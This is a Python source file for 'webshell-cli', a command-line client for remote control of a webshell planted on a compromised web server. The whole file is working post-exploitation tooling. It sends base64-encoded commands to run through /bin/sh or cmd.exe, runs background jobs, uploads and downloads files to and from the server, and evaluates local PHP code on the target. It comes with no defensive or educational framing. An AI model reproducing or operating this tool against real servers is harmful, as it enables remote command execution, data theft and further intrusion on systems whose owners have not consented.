#!/usr/bin/python3 -W ignore

import sys
import shlex
import base64
import pathlib
import requests
import argparse
from os.path import normpath
from typing import Union, Callable
from prompt_toolkit import prompt
from prompt_toolkit.styles import Style
from prompt_toolkit.lexers import PygmentsLexer
from pygments.lexers.shell import BashLexer, BatchLexer
from prompt_toolkit.history import History, InMemoryHistory, FileHistory


style = Style.from_dict({
                          'username':   '#33cc33',
                          'host':       '#33cc33',
                          'path':       '#666699',
                        })


class InternalError(Exception):
    '''
    Internal error. Non recoverable.
    '''


class ServerError(Exception):
    '''
    Server returned unexpected status code.
    '''


class InvalidDirectoryException(Exception):
    '''
    When the user attempted to change into an invalid server directory.
    '''


class ParameterCountException(Exception):
    '''
    When the application server returned unexpected output.
    '''


class InvalidProtocolException(Exception):
    '''
    When the user specified URL uses an invalid protocol.
    '''


def prepare_url(url: str) -> str:
    '''
    Parses the user specified URL and adds an HTTP prefix if required.

    Parameters:
        url         user specified URL

    Returns:
        url         prepared URL
    '''
    try:
        protocol, rest = url.split(':/', 1)

        if protocol not in ['https', 'http']:
            raise InvalidProtocolException(f'Unsupported protocol: {protocol}')

        return url

    except ValueError:
        return f'http://{url}'


def b64(data: Union[str, bytes, pathlib.PurePath]) -> str:
    '''
    Takes a string, bytes or a path and encodes it into base64.

    Parameters:
        data        data to encode

    Returns:
        str         base64 encoded string
    '''
    if type(data) == str:
        data = data.encode()

    elif issubclass(type(data), pathlib.PurePath):
        data = str(data).encode()

    return base64.b64encode(data).decode()


def b64d(data: Union[str, bytes]) -> bytes:
    '''
    Takes a string or bytes representing base64 content
    and decodes it.

    Parameters:
        string      base64 string to decode

    Returns:
        bytes       data decoded from the base64
    '''
    if type(data) == str:
        data = data.encode()

    return base64.b64decode(data)


def print_help() -> None:
    '''
    Prints a help message on actions that are available within a shell.

    Parameters:
        None

    Returns:
        None
    '''
    offset = 30
    print('usage:')
    print('')
    print('    <cmd>'.ljust(offset), 'execute the specified command')
    print('    cd <dir>'.ljust(offset), 'change the current working directory')
    print('    !background <cmd>'.ljust(offset), 'execute the specified command in the background')
    print('    !download <rfile> <lfile>'.ljust(offset), 'download a remote file from the server')
    print('    !upload <lfile> <rfile>'.ljust(offset), 'upload a local file to the server')
    print('    !eval <lfile>'.ljust(offset), 'evaluate a local file on the server (only when php)')
    print('    !env <var>=<val>'.ljust(offset), 'set an environment variable')
    print('    !help'.ljust(offset), 'show this help menu')


def check_shell(shell: str) -> None:
    '''
    Checks whether the specified shell contains invalid characters.

    Parameters:
        shell           The user specified shell

    Returns:
        None
    '''
    if shell and ("'" in shell or '"' in shell):
        print('[-] Error: The value specified by --shell cannot contain quotes.')
        sys.exit(1)


def print_result(result: str) -> None:
    '''
    Helper function that prints the result of an operation. It checks
    whether the result already ends with a newline and does not print
    an additional newline if this is the case.

    Parameters:
        result              result to print

    Returns:
        None
    '''
    if not result:
        return

    if result[-1] == '\n':
        print(result, end='')

    else:
        print(result)


class Webshell:
    '''
    The webshell class is used to interact with a webshell.
    '''
    action = 'action'
    cmd_param = 'b64_cmd'
    env_param = 'b64_env'
    back_param = 'back'
    orig_param = 'b64_orig'
    chdir_param = 'chdir'
    upload_param = 'b64_upload'
    filename_param = 'b64_filename'

    cmd_action = 'cmd'
    init_action = 'init'
    eval_action = 'eval'
    upload_action = 'upload'
    download_action = 'download'

    def __init__(self, url: str, shell: str) -> None:
        '''
        Initializes a webshell object. The only really required parameter is
        the URL the webshell is reachable on. The shell parameter can be
        optionally specified (set to None otherwise) to use a specific shell
        command on the server side.

        Parameters:
            url             The URL of the webshell
            shell           Shell command to use on the server side

        Returns:
            None
        '''
        self.url = url
        self.shell = shell

        self.env = {}
        self.user = None
        self.type = None
        self.host = None
        self.path = None

        self.posix = None
        self.path_func = None

        self.init()

    def init(self) -> None:
        '''
        Obtains the current username, hostname and path from the application server.

        Parameters:
            None

        Returns:
            None
        '''
        response = requests.post(self.url, data={Webshell.action: Webshell.init_action})
        result = Webshell.get_response(response, 'init')

        sep, self.type, self.user, self.host, self.path = self.get_values(result, 5, True, False)

        if sep == '\\':
            self.posix = False
            self.path_func = pathlib.PureWindowsPath

            if self.shell is None:
                self.shell = 'cmd.exe /c'

        else:
            self.posix = True
            self.path_func = pathlib.PurePosixPath

            if self.shell is None:
                self.shell = '/bin/sh -c'

        self.path = self.path_func(self.path)
        self.shell = '<@:SEP:@>'.join(self.shell.split()) + '<@:SEP:@>'

    def add_env(self, cmd: str) -> None:
        '''
        Add a new environment variable.

        Parameters:
            cmd             command that contains the environment varibale

        Returns:
            None
        '''
        if not cmd.startswith('!env'):
            raise InternalError('env was called despite !env not used.')

        if cmd.strip() == '!env':

            print('[+] Currently set environment variables:')

            for key, value in self.env.items():
                print(f'[+]   {key}={value}')

            return

        elif cmd.strip() == '!env clear':

            self.env = {}
            print('[+] Environment variables were cleared.')
            return

        try:
            _, spec = cmd.split(' ', 1)
            key, value = spec.split('=', 1)

        except ValueError:
            return f'[-] The specified variable defintion is invalid: {cmd}'

        if value:
            self.env[key] = value

        else:
            self.env.pop(key, None)

        return f'[+] Set environment variable: {key}={value}'

    def get_env(self) -> str:
        '''
        Return the currently set environment variables as base64 strings separated by :.

        Parameters:
            None

        Returns:
            str             base64 encoded environment variables
        '''
        return_value = ''

        for key, value in self.env.items():
            return_value += b64(f'{key}={value}') + ':'

        return return_value[0:-1]

    def issue_command(self, cmd: str, background: bool = False) -> str:
        '''
        Sends the specified command to the webshell and returns the output of it.
        If background is set to true, the output is not awaited.

        Parameters:
            cmd             Command to execute
            background      Execute as background command

        Returns:
            result          Command result (if background was not used)
        '''
        data = {
                 Webshell.action: Webshell.cmd_action,
                 Webshell.back_param: background,
                 Webshell.cmd_param: b64(f'{self.shell}{cmd}'),
                 Webshell.chdir_param: b64(self.path),
                 Webshell.env_param: self.get_env(),
               }

        if background:

            if not cmd.startswith('!background'):
                raise InternalError('background was called despite !background not used.')

            _, cmd = cmd.split(' ', 1)
            data[Webshell.cmd_param] = b64(f'{self.shell}{cmd}')

            try:
                requests.post(self.url, data=data, timeout=0.0000000001)

            except requests.exceptions.ReadTimeout:
                pass

        else:

            response = requests.post(self.url, data=data)
            result = Webshell.get_response(response, 'issue_command')

            result, self.path = self.get_values(result, 2, True)
            return result

    def eval(self, cmd: str) -> str:
        '''
        Parses the local filename from the eval command and sends the file content to the
        server. The content is then used within an eval statement. This function can only
        be called within php shells.

        Parameters:
            cmd             eval command containing the local script name

        Returns:
            None
        '''
        if not cmd.startswith('!eval'):
            raise InternalError('eval was called despite !eval not used.')

        if self.type != 'php':
            return '[-] !eval can only be used in a php shell.'

        _, path = cmd.split(' ', 1)
        path = pathlib.Path(path)

        try:
            content = path.read_text()
            content = content.strip('<?php|<?|?>')

        except Exception:
            return f'[-] Unable to read local file {path.absolute()}.'

        data = {
                 Webshell.action: Webshell.eval_action,
                 Webshell.chdir_param: b64(self.path),
                 Webshell.env_param: self.get_env(),
                 Webshell.upload_param: b64(content),
               }

        response = requests.post(self.url, data=data)
        Webshell.get_response(response, 'eval')

        return f'[+] {path.absolute()} was evaluated by the server.'

    def change_directory(self, cmd: str = None) -> str:
        '''
        Attempts to change the working directory. This function sends the requested directory
        change to the server and attempts to validate it. If the directory is valid, the new
        absolute path is returned. If it is invalid, an empty response is returned.

        Parameters:
            cmd             cd command. Needs to start with cd.

        Returns:
            cwd             Current working directory on the server side
        '''
        if not cmd.startswith('cd'):
            raise InternalError('change_directory was called despite cd not used.')

        _, path = cmd.split(' ', 1)

        if not self.path_func(path).is_absolute() and self.path is not None:
            path = self.path.joinpath(path)

        response = requests.post(self.url, data={Webshell.chdir_param: b64(normpath(path))})
        result = Webshell.get_response(response, 'change_directory')

        self.path = self.get_values(result, 1, True)[0]

    def upload_file(self, cmd: str) -> str:
        '''
        Expects command to be of the form '!upload <lfile> <rfile> and uploads
        <lfile> to <rfile> on the server.

        Parameters:
            cmd         File upload command

        Returns:
            result      Success or Failure
        '''
        if not cmd.startswith('!upload'):
            raise InternalError('upload_file was called despite !upload not used.')

        try:
            (lfile, rfile) = self.get_files(cmd, pathlib.Path, self.path_func)

        except ValueError:
            return '[-] !upload <lfile> <rfile>'

        if not lfile.is_file():
            return f'[-] Local file {lfile} does not exist'

        if not rfile.is_absolute():
            rfile = self.path.joinpath(rfile)

        content = lfile.read_bytes()

        request_data = {
                         Webshell.action: Webshell.upload_action,
                         Webshell.upload_param: b64(content),
                         Webshell.filename_param: b64(rfile),
                         Webshell.chdir_param: b64(self.path),
                         Webshell.orig_param: b64(lfile.name)
                       }

        response = requests.post(self.url, data=request_data)
        Webshell.get_response(response, 'upload_file')

        return f'[+] Uploaded {len(content)} Bytes to {rfile}'

    def download_file(self, cmd: str) -> str:
        '''
        Expects command to be of the form '!download <rfile> <lfile> and downloads
        <rfile> to <lfile> on the local system.

        Parameters:
            cmd         File download command

        Returns:
            result      Success or Failure
        '''
        if not cmd.startswith('!download'):
            raise InternalError('download_file was called despite !download not used.')

        try:
            (rfile, lfile) = self.get_files(cmd, self.path_func, pathlib.Path)

        except ValueError:
            return '[-] !download <rfile> <lfile>'

        if not rfile.is_absolute():
            rfile = self.path.joinpath(rfile)

        request_data = {
                          Webshell.action: Webshell.download_action,
                          Webshell.filename_param: b64(rfile),
                          Webshell.chdir_param: b64(self.path)
                       }

        response = requests.post(self.url, data=request_data)
        result = Webshell.get_response(response, 'download_file')

        content, _ = self.get_values(result, 2, False)

        try:

            if content:
                lfile.write_bytes(content)
                return f'[+] Saved {len(content)} Bytes to {lfile.absolute()}.'

            else:
                return '[-] Skipping download of empty (probably not existing) file.'

        except Exception:
            return f'[-] Unable to write file {lfile.absolute()}.'

    def get_values(self, data: str, count: int, decode: bool = False, path: bool = True) -> list:
        '''
        Expects a string of colon separated base64 strings. Decodes
        each string and returns it within a list. If the number of
        decoded strings does not match the expected count, raises
        an exception. The last part of the incoming data usually
        expected to be a path and is wrapped into a Path object. If
        this behavior is not desired, the path parameter should be set
        to false.

        Parameters:
            data        colon separated base64 strings
            count       expected count of arguments
            decode      Whether to decode bytes to string
            path        Whether to interpret the last item as path

        Returns:
            list        list containing the decoded values
        '''
        return_value = []
        split = data.split(':')

        if len(split) != count:
            raise ParameterCountException(f'Obtained an insufficient amount of parameters: {len(split)}')

        for item in split:

            if decode:
                result = b64d(item).decode()

            else:
                result = b64d(item)

            return_value.append(result)

        if decode and path:
            return_value[-1] = self.path_func(return_value[-1])

        return return_value

    def get_response(response: requests.Response, action: str) -> str:
        '''
        Extracts the HTTP response text and handles some common errors.
        The status code 202 is expected to be returned if the requested
        directory does not exist on the server side. It is required to choose
        a non-error HTTP status for this purpose, as in the case of HTTP
        error status codes, the response text is sometimes supressed.

        Parameters:
            response    HTTP response to a webshell-cli request
            action      The currently executed action

        Returns:
            str         extracted response text
        '''
        if response.status_code == 202:
            message = b64d(response.text).decode()
            raise InvalidDirectoryException(message)

        if response.status_code != 200:
            message = f'HTTP status code for {action}: {response.status_code}'
            message += ' - ' + response.text if response.text else ''
            raise ServerError(message)

        return response.text

    def get_files(self, cmd: str, path_func1: Callable, path_func2: Callable) -> tuple:
        '''
        This helper function is used to extract filenames from !upload or !download
        calls. It simply uses shlex to parse the filenames and returns them as a tuple.
        The filenames are returned as paths. The kind of paths that is expected
        (WindowsPath, PosixPath) needs to be specified.

        Parameters:
            cmd             Upload or Download command
            path_func1      Path type of the first file
            path_func2      Path type of the second file

        Returns:
            files           Tuple containing the filenames
        '''
        split = shlex.split(cmd, posix=self.posix)
        length = len(split)

        if length < 2:
            raise ValueError('[-] Syntax error.')

        if length == 2:
            file1 = path_func1(split[1])
            file2 = path_func2(file1.name)

        else:
            file1 = path_func1(split[1])
            file2 = path_func2(split[2])

        return (file1, file2)

    def cmd_loop(self, history: History) -> None:
        '''
        Starts an infinite loop that constantly asks the user for new commands.

        Parameters:
            history         The prompt_toolkit history to use for the shell

        Returns:
            None
        '''
        while True:

            try:

                prompt_str = [
                                ('', '['),
                                ('class:username', self.user),
                                ('', '@'),
                                ('class:host', self.host),
                                ('', ' '),
                                ('class:path', str(self.path)),
                                ('', ']$ ')
                            ]

                lexer = BashLexer if self.posix else BatchLexer
                cmd = prompt(prompt_str, history=history, lexer=PygmentsLexer(lexer), style=style)

                result = self.handle_cmd(cmd)
                print_result(result)

            except KeyboardInterrupt:
                print('[-] Aborted.')

            except ParameterCountException:
                print('[-] Server response contained an unexpected amount of parameters.')

            except (ValueError, InvalidDirectoryException) as e:
                print(f'[-] {e}')

            except ServerError as e:
                print('[-] The specified action caused an server error.')
                print(f'[-] Error: {e}')

            except EOFError:
                print('[-] EOF.')
                sys.exit(1)

            except InternalError as e:
                print(f'[-] An internal error occured: {e}')
                sys.exit(1)

    def handle_cmd(self, cmd: str) -> str:
        '''
        Handles the cmd specified during a loop iteration.

        Parameters:
            cmd             command specified during the iteration

        Returns:
            result          command result
        '''
        if cmd.startswith('!env'):
            return self.add_env(cmd)

        elif cmd.startswith('!eval'):
            return self.eval(cmd)

        elif cmd.startswith('!upload'):
            return self.upload_file(cmd)

        elif cmd.startswith('!download'):
            return self.download_file(cmd)

        elif cmd.startswith('!background'):
            return self.issue_command(cmd, True)

        elif cmd.startswith('cd'):
            return self.change_directory(cmd)

        elif cmd.startswith('help') or cmd.startswith('!help'):
            print_help()

        elif cmd.strip() == 'exit':
            sys.exit(0)

        elif cmd:
            return self.issue_command(cmd)


history = str(pathlib.Path.home().joinpath('.webshell_cli_history'))

parser = argparse.ArgumentParser(description='''webshell-cli v1.0.0 - A simple command line interface for webshells''')
parser.add_argument('url', help='url of the webshell')
parser.add_argument('-m', '--memory', action='store_true', help='use InMemoryHistory instead of FileHistory')
parser.add_argument('-f', '--file-history', default=history, help=f'location of history file (default: {history})')
parser.add_argument('-s', '--shell', default=None, help='use the specified shell command (e.g. "powershell -c")')
args = parser.parse_args()

check_shell(args.shell)

try:

    if args.memory:
        history = InMemoryHistory()

    else:
        fh = open(args.file_history, 'a')
        fh.close()

        history = FileHistory(args.file_history)

    url = prepare_url(args.url)
    webshell = Webshell(url, args.shell)
    webshell.cmd_loop(history)

except ServerError as e:
    print(f'[-] Caught ServerError. Webshell at {args.url} is not functional.')
    print(f'[-] Error: {e}')

except ParameterCountException:
    print('[-] Server response contained an unexpected amount of parameters.')
    print(f'[-] Webshell at {args.url} is not functional.')

except IsADirectoryError as e:
    print('[-] The specified filename is an existing directory:')
    print(f'[-] {e}')

except PermissionError as e:
    print('[-] Insufficient permissions to access the specified resource:')
    print(f'[-] {e}')

except FileNotFoundError as e:
    print('[-] The specified file (or parent directory) was not found:')
    print(f'[-] {e}')

except (ValueError, InvalidProtocolException) as e:
    print(f'[-] {e}')

except requests.exceptions.ConnectionError as e:
    print('[-] Cannot connect to the specified target:')
    print(f'[-] {e}')
